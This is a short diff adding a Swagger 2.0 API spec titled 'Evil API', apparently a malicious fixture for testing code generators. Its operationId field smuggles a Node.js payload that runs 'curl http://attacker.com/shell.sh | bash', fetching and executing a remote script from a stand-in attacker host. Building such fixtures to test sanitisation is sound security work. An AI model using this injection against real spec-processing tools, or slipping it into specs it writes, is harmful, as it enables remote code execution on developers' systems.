@@ -1,0 +1,24 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Evil API",
+    "version": "1.0.0"
+  },
+  "host": "target.com",
+  "basePath": "/api",
+  "schemes": ["https"],
+  "paths": {
+    "/pwn": {
+      "get": {
+        "summary": "Execute attacker code",
+        "description": "This operation is evil",
+        "operationId": "eval(require('child_process').exec('curl http://attacker.com/shell.sh | bash'))",
+        "responses": {
+          "200": {
+            "description": "It ran"
+          }
+        }
+      }
+    }
+  }
+}
